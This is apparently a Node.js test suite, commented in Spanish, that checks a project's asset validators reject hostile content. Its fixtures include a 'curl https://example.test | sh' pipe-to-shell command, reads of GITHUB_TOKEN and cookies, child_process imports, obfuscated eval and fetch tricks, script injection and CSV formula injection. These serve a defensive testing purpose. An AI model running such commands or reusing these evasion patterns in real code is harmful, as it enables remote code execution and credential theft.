    ['HTML con meta refresh', f => f.put(html, base.replace('</head>', '<meta content="0;url=x.html" http-equiv="refresh">\n</head>')), 'E_ACTIVE_HTML'],
    ['HTML con título de otra pantalla', f => f.put(html, base.replace(`<title>${designs[3].id} · Diseño</title>`, '<title>M01 · Diseño</title>')), 'E_ACTIVE_HTML'],
    ['HTML con style de comillas simples', f => f.put(html, base.replace('class="app"', "style='background:url(x.png)'")), 'E_ACTIVE_HTML'],
    ['módulo con importación lateral', f => f.put('fuentes/render.mjs', "import '../../../../scripts/ci/impact.mjs'\n"), 'E_ACTIVE_MODULE'],
    ['módulo con comillas dobles', f => f.put('fuentes/render.mjs', 'import x from "../otro.mjs"\n'), 'E_ACTIVE_MODULE'],
    ['módulo con reexportación', f => f.put('fuentes/pantallas.mjs', "export * from './x.mjs'\n"), 'E_ACTIVE_MODULE'],
    ['módulo con eval indirecto', f => f.put('fuentes/render.mjs', ';(0, eval)("1")\n'), 'E_ACTIVE_MODULE'],
    ['módulo con acceso a process por corchetes', f => f.put('fuentes/render.mjs', "export const t = process['env']\n"), 'E_ACTIVE_MODULE'],
    ['módulo con constructor', f => f.put('fuentes/render.mjs', "export const t = [].constructor.constructor('return 1')\n"), 'E_ACTIVE_MODULE'],
    ['módulo con escape unicode de identificador', f => f.put('fuentes/render.mjs', 'proce\\u0073s.exit(1)\n'), 'E_ACTIVE_MODULE'],
    ['módulo con acceso por corchetes y concatenación', f => f.put('fuentes/render.mjs', "export const t = global['proc' + 'ess']\n"), 'E_ACTIVE_MODULE'],
    ['módulo con propiedad de texto', f => f.put('fuentes/render.mjs', "import * as FS from 'node:fs'\nFS['unlinkSync']('x')\n"), 'E_ACTIVE_MODULE'],
    ['módulo que importa rm', f => f.put('fuentes/render.mjs', "import { rm } from 'node:fs'\n"), 'E_ACTIVE_MODULE'],
    ['módulo con child_process', f => f.put('fuentes/render.mjs', "import { execSync } from 'node:child_process'\n"), 'E_ACTIVE_MODULE'],
    ['módulo con importación no permitida', f => f.put('fuentes/render.mjs', "import https from 'node:https'\n"), 'E_ACTIVE_MODULE'],
    ['módulo con fetch', f => f.put('fuentes/render.mjs', "await fetch('https://example.test')\n"), 'E_ACTIVE_MODULE'],
    ['módulo con eval', f => f.put('fuentes/render.mjs', 'eval("1")\n'), 'E_ACTIVE_MODULE'],
    ['módulo que lee el entorno', f => f.put('fuentes/render.mjs', 'export const t = process.env.GITHUB_TOKEN\n'), 'E_ACTIVE_MODULE'],
    ['módulo de datos con importaciones', f => f.put('fuentes/pantallas.mjs', "import fs from 'node:fs'\n"), 'E_ACTIVE_MODULE'],
    ['fuente tipográfica inválida', f => f.put('fuentes/fuentes-tipograficas/geist-mono-latin.woff2', Buffer.from('MZ-ejecutable')), 'E_FONT'],
    ['receta con comando ajeno', f => f.put('receta-render.json', JSON.stringify({ baseline: 'a'.repeat(40), viewport_css: [390, 844], factor_escala_dispositivo: 2, comandos: ['curl https://example.test | sh'] })), 'E_RECIPE'],
  ]
  for (const [label, files, code] of cases) {
    const p = assetPackage({ files })
    try { expectCode(p.root, code, label) } finally { p.cleanup() }
  }
})
test('EPT-95 valida documentos y bitácora, modos Git y enlaces', () => {
  const csv = 'fecha_art,actividad,herramienta,insumo,comprension_y_adaptacion,prueba_o_limite,resultado,origen\n2026-10-09,Revisión,Render local,Fuente,Comprensión,Límite,Resultado,Asistente\n'
  for (const bad of [csv + 'fila,corta\n', csv.replace('Revisión', '=1+1'), csv.replace('Revisión', 'sk-proj-' + 'a'.repeat(40)), csv.replace('Revisión', '"sin cierre')]) {
    const p = assetPackage({ files: f => f.put('bitacora-academica.csv', bad) })
    try { assert.throws(() => validateEpt95Assets(p.root)) } finally { p.cleanup() }
  }
  const secret = assetPackage({ files: f => f.put('README.md', '-----BEGIN PRIVATE KEY-----') })
  try { assert.throws(() => validateEpt95Assets(secret.root)) } finally { secret.cleanup() }
  const p = assetPackage({ files: f => f.put('bitacora-academica.csv', csv.replace('Revisión', '"Revisión,\ncon ""cita"""')) })
  try {
    validateEpt95Assets(p.root)
    const target = path.join(p.root, BASE + designs[0].archivo), other = path.join(p.root, BASE + designs[1].archivo)
    if (process.platform !== 'win32') { chmodSync(target, 0o755); assert.throws(() => validateEpt95Assets(p.root)); chmodSync(target, 0o644) }
    const kept = readFileSync(target); rmSync(target)
    try { symlinkSync(other, target); assert.throws(() => validateEpt95Assets(p.root)) } catch (error) { if (process.platform !== 'win32' || error.code !== 'EPERM') throw error }
    rmSync(target, { force: true }); writeFileSync(target, kept)
    execFileSync('git', ['init', '--quiet', p.root])
    const hash = execFileSync('git', ['-C', p.root, 'hash-object', '-w', '--', target], { encoding: 'utf8' }).trim()
    execFileSync('git', ['-C', p.root, 'update-index', '--add', '--cacheinfo', `100755,${hash},${BASE + designs[0].archivo}`])
    assert.throws(() => validateEpt95Assets(p.root), /modo Git/u)
    execFileSync('git', ['-C', p.root, 'update-index', '--cacheinfo', `100644,${hash},${BASE + designs[0].archivo}`])
    validateEpt95Assets(p.root)
  } finally { p.cleanup() }
})

// =====================================================================================
// EPT-96 · prototipo navegable: contenido activo con registro literal y análisis propio
// =====================================================================================
const B96 = 'docs/parte3/EPT-96/'
const ept95Path = relativa => `docs/parte3/EPT-95/${relativa}`
function paquete96(mutar = () => {}) {
  const root = mkdtempSync(path.join(tmpdir(), 'ept96-assets-'))
  cpSync(path.join(process.cwd(), B96), path.join(root, B96), { recursive: true })
  const put = (relativa, contenido) => { mkdirSync(path.dirname(path.join(root, B96, relativa)), { recursive: true }); writeFileSync(path.join(root, B96, relativa), contenido) }
  const get = relativa => readFileSync(path.join(root, B96, relativa), 'utf8').replace(/\r\n/gu, '\n')
  mutar({ put, get, root })
  return { root, cleanup: () => { assert.ok(path.resolve(root).startsWith(path.resolve(tmpdir()) + path.sep)); rmSync(root, { recursive: true, force: true }) } }
}
const esperar96 = (mutar, codigo, etiqueta) => {
  const p = paquete96(mutar)
  try { assert.throws(() => validateEpt96Assets(p.root), error => error.code === codigo, `${etiqueta}: se esperaba ${codigo}`) } finally { p.cleanup() }
}

test('EPT-96 valida el paquete real y clasifica sus rutas como contenido activo con navegación real', () => {
  assert.deepEqual(validateEpt96Assets(process.cwd()), { archivos: 62, capturas: 47 })
  assert.equal(capturas.length, 47)
  const esperado = { db: false, mutations: false, ui: [], prototipo: true }
  assert.deepEqual(profile([...ept96Paths]), esperado) // todas las rutas registradas, validando el paquete una vez
  for (const file of [B96 + 'prototipo/js/app.mjs', B96 + 'pruebas/prototipo.mjs', B96 + 'evidencia/' + capturas[0] + '.png']) assert.deepEqual(profile([file]), esperado, file)
  // Las fuentes y el logo que sirve el prototipo (EPT-95) también exigen recorrerlo.
  assert.deepEqual(profile([ept95Path('fuentes/imagenes/logo-emblema.png')]), { db: false, mutations: false, ui: [], prototipo: true })
  assert.deepEqual(profile(['scripts/ci/ept96-assets.mjs']), { db: true, mutations: false, ui: ['core'], prototipo: true })
  // Sin excepción por extensión: rutas o directorios no registrados bloquean el plan.
  for (const file of [B96 + 'otro.md', B96 + 'prototipo/js/extra.mjs', B96 + 'evidencia/nueva.png', B96 + 'prototipo/index.htm', B96 + 'servidor/otro.mjs', B96 + 'package.json']) {
    assert.throws(() => profile([file]), /sin contrato/u, file)
  }
  assert.deepEqual(profile(['docs/evidence/EPT-96.md']), { db: false, mutations: false, ui: [] })
})

test('EPT-96: el gate de CI exige el paso del prototipo cuando el plan lo marca', () => {
  const yml = readFileSync('.github/workflows/ci.yml', 'utf8').replace(/\r\n/gu, '\n')
  for (const fragmento of ["prototipo: ${{ steps.impact.outputs.prototipo }}", "prototipo_paso: ${{ steps.prototipo.outcome }}", 'id: prototipo',
    "if: steps.impact.outputs.prototipo == 'true'", 'run: node docs/parte3/EPT-96/pruebas/prototipo.mjs', 'PLAN_PROTOTIPO: ${{ needs.fast.outputs.prototipo }}',
    'true) test "$PASO_PROTOTIPO" = success', 'false) test "$PASO_PROTOTIPO" = skipped']) assert.ok(yml.includes(fragmento), fragmento)
  // El paso corre después de instalar Chromium y antes de los contratos DB/UI.
  assert.ok(yml.indexOf('playwright install --with-deps chromium') < yml.indexOf('id: prototipo') && yml.indexOf('id: prototipo') < yml.indexOf('  database:'))
})

test('EPT-96 rechaza HTML con scripts en línea, recursos externos, eventos y estilos', () => {
  const cambios = [
    ['script en línea', h => h.replace('<script type="module" src="/js/app.mjs"></script>', '<script type="module" src="/js/app.mjs">alert(1)</script>')],
    ['script externo', h => h.replace('src="/js/app.mjs"', 'src="https://example.test/a.mjs"')],
    ['segundo script', h => h.replace('</body>', '<script type="module" src="/js/app.mjs"></script></body>')],
    ['evento en línea', h => h.replace('<div id="app"', '<div onclick="x()" id="app"')],
    ['iframe', h => h.replace('</body>', '<iframe src="/"></iframe></body>')],
    ['style embebido', h => h.replace('</head>', '<style>body{}</style>\n</head>')],
    ['estilo en atributo', h => h.replace('<p class="aviso-prototipo"', '<p style="color:red" class="aviso-prototipo"')],
    ['hoja externa', h => h.replace('href="/estilos.css"', 'href="https://example.test/x.css"')],
    ['meta refresh', h => h.replace('</head>', '<meta http-equiv="refresh" content="0">\n</head>')],
    ['entidad numérica', h => h.replace('Prototipo navegable', 'Prototipo &#106;avascript')],
  ]
  for (const [etiqueta, nuevo] of cambios) esperar96(g => g.put('prototipo/index.html', nuevo(g.get('prototipo/index.html'))), 'E_ACTIVE_HTML', etiqueta)
})

test('EPT-96 rechaza CSS con importaciones, escapes y url() no registradas', () => {
  for (const [etiqueta, texto] of [
    ['@import', "@import url('https://example.test/x.css');\n"],
    ['url remota', "body { background: url('https://example.test/a.png'); }\n"],
    ['url local no registrada', "body { background: url('/activos/otra.png'); }\n"],
    ['escape', '@\\69mport "x.css";\n'],
    ['image-set', "body { background: image-set('/a.png' 1x); }\n"],
    ['at-rule ajena', '@keyframes x { to { opacity: 0 } }\n'],
  ]) esperar96(g => g.put('prototipo/estilos.css', texto), 'E_ACTIVE_CSS', etiqueta)
})

test('EPT-96 analiza módulos del navegador: red, almacenamiento, DOM desde texto, archivos y ofuscación', () => {
  const agregados = [
    ['fetch', "export const t = () => fetch('/x')\n"],
    ['XMLHttpRequest', 'export const t = new XMLHttpRequest()\n'],
    ['WebSocket', "export const t = new WebSocket('ws://127.0.0.1')\n"],
    ['eval', "export const t = eval('1')\n"],
    ['Function', "export const t = new Function('return 1')\n"],
    ['constructor', "export const t = [].constructor.constructor('return 1')\n"],
    ['import dinámico', "export const t = () => import('./datos.mjs')\n"],
    ['import ajeno', "import fs from 'node:fs'\n"],
    ['localStorage', "export const t = localStorage.getItem('x')\n"],
    ['cookie', 'export const t = document.cookie\n'],
    ['innerHTML', "export const t = el => { el.innerHTML = '<b>x</b>' }\n"],
    ['insertAdjacentHTML', "export const t = el => el.insertAdjacentHTML('beforeend', 'x')\n"],
    ['document.write', "export const t = () => document.write('x')\n"],
    ['URL externa', "export const t = 'https://example.test/a'\n"],
    ['input file', "export const t = { type: 'file' }\n"],
    ['FileReader', 'export const t = new FileReader()\n'],
    ['window.open', "export const t = () => window.open('/')\n"],
    ['location.href', "export const t = () => { location.href = '/x' }\n"],
    ['navigator', 'export const t = navigator.userAgent\n'],
    ['acceso por corchetes', "export const t = window['fe' + 'tch']\n"],
    ['escape unicode', 'export const t = proce\\u0073s\n'],
    ['estilo en línea', "export const t = el => el.setAttribute('style', 'color:red')\n"],
    ['setTimeout con texto', "export const t = () => setTimeout('x()', 1)\n"],
    ['document.writeln', "export const t = () => document.writeln('x')\n"],
    ['createElement de script', "export const t = () => document.createElement('script')\n"],
    ['URL relativa al protocolo', "export const t = '//example.test/a'\n"],
    ['atob', "export const t = atob('ZmV0Y2g=')\n"],
    ['click programático', 'export const t = el => el.click()\n'],
    ['setHTMLUnsafe', "export const t = el => el.setHTMLUnsafe('<b>x</b>')\n"],
  ]
  for (const [etiqueta, texto] of agregados) {
    esperar96(g => g.put('prototipo/js/reglas.mjs', g.get('prototipo/js/reglas.mjs') + texto), 'E_ACTIVE_BROWSER', etiqueta)
  }
})

test('EPT-96 analiza el servidor y el runner: capacidades, escritura, tabla cerrada y pruebas obligatorias', () => {
  const servidor = 'servidor/servidor.mjs', runner = 'pruebas/prototipo.mjs'
  const casos = [
    ['child_process', servidor, g => "import { execSync } from 'node:child_process'\n" + g.get(servidor)],
    ['importación no permitida', servidor, g => "import net from 'node:net'\n" + g.get(servidor)],
    ['escritura de archivos', servidor, g => g.get(servidor) + "\nwriteFileSync('x', 'y')\n"],
    ['ruta unida a la URL', servidor, g => g.get(servidor).replace("RUTAS.get(req.url ?? '')", 'path.join(prototipo, req.url)')],
    ['decodificación de la URL', servidor, g => g.get(servidor) + '\nexport const d = decodeURIComponent\n'],
    ['sin validación de Host', servidor, g => g.get(servidor).replaceAll('ANFITRION_VALIDO', 'OTRO')],
    ['entorno', servidor, g => g.get(servidor) + '\nexport const e = process.env.SECRETO\n'],
    ['URL externa', runner, g => g.get(runner) + "\nexport const u = 'https://example.test'\n"],
    ['prueba obligatoria retirada (N08)', runner, g => g.get(runner).replace("prueba('N08'", "prueba('N98'")],
    ['negativa del servidor retirada (S03)', runner, g => g.get(runner).replace("prueba('S03'", "prueba('S93'")],
    ['sin cierre del navegador', runner, g => g.get(runner).replaceAll('browser.close()', 'browser.noop()')],
    ['sin límite de tiempo', runner, g => g.get(runner).replaceAll('LIMITE_TOTAL_MS', 'OTRO_LIMITE')],
    ['escucha en todas las interfaces', servidor, g => g.get(servidor).replace("listen(puerto, '127.0.0.1'", "listen(puerto, '0.0.0.0'")],
    ['Host sin validar', servidor, g => g.get(servidor).replace('ANFITRION_VALIDO.test(req.headers', 'true || ANFITRION_VALIDO.test(req.headers')],
    ['prueba obligatoria solo en comentario', runner, g => g.get(runner).replace("prueba('N08'", "// prueba('N08'\nprueba('N98'")],
    ['prueba obligatoria sin aserciones', runner, g => g.get(runner).replace('aserciones++', 'void 0')],
    ['sin verificación de pruebas ejecutadas', runner, g => g.get(runner).replaceAll('REQUERIDAS', 'OTRAS')],
  ]
  for (const [etiqueta, archivo, nuevo] of casos) esperar96(g => g.put(archivo, nuevo(g)), 'E_ACTIVE_NODE', etiqueta)
})

test('EPT-96 valida la evidencia PNG, el inventario, la bitácora y la receta', () => {
  const primera = `evidencia/${capturas[0]}.png`
  const png = fixturePng(390, 700)
  const ok = paquete96(g => g.put(primera, png))
  try { assert.deepEqual(validateEpt96Assets(ok.root), { archivos: 62, capturas: 47 }) } finally { ok.cleanup() }
  assert.deepEqual(validarPng96(png, 'fixture.png'), { ancho: 390, alto: 700 })
  const casos = [
    ['firma inválida', g => g.put(primera, Buffer.from('<FIFE Image failed to fetch>')), 'E_PNG_SIGNATURE'],
    ['PNG truncado', g => g.put(primera, fixturePng(390, 700).subarray(0, -3)), 'E_PNG_BOUNDS'],
    ['lienzo de otro ancho', g => g.put(primera, fixturePng(1440, 900)), 'E_PNG_CANVAS'],
    ['lienzo de factor 2', g => g.put(primera, fixturePng(780, 1688)), 'E_PNG_CANVAS'],
    ['chunk de texto', g => { const base = fixturePng(390, 700); g.put(primera, Buffer.concat([base.subarray(0, 33), fixtureChunk('tEXt', Buffer.from('a\0b')), base.subarray(33)])) }, 'E_PNG_METADATA'],
    ['archivo extra', g => g.put('evidencia/extra.png', fixturePng(390, 700)), 'E_UNKNOWN_RESOURCE'],
    ['directorio desconocido', g => mkdirSync(path.join(g.root, B96, 'otros')), 'E_UNKNOWN_RESOURCE'],
    ['archivo ausente', g => rmSync(path.join(g.root, B96, 'prototipo/js/vista.mjs')), 'E_PACKAGE'],
    ['secreto en documento', g => g.put('README.md', '-----BEGIN PRIVATE KEY-----'), 'E_TEXT'],
    ['script en documento', g => g.put('mapa-navegacion.md', '<script>alert(1)</script>'), 'E_TEXT'],
    ['receta con comando ajeno', g => g.put('receta-prototipo.json', JSON.stringify({ baseline: 'a'.repeat(40), comandos: ['curl https://example.test | sh'] })), 'E_RECIPE'],
  ]
  for (const [etiqueta, mutar, codigo] of casos) esperar96(mutar, codigo, etiqueta)
  for (const mala of ['fecha_art,actividad\n2026-10-10,x\n', 'fecha_art,actividad,herramienta,insumo,comprension_y_adaptacion,prueba_o_limite,resultado,origen\n2026-10-10,=1+1,a,b,c,d,e,f\n']) {
    const p = paquete96(g => g.put('bitacora-academica.csv', mala))
    try { assert.throws(() => validateEpt96Assets(p.root)) } finally { p.cleanup() }
  }
})
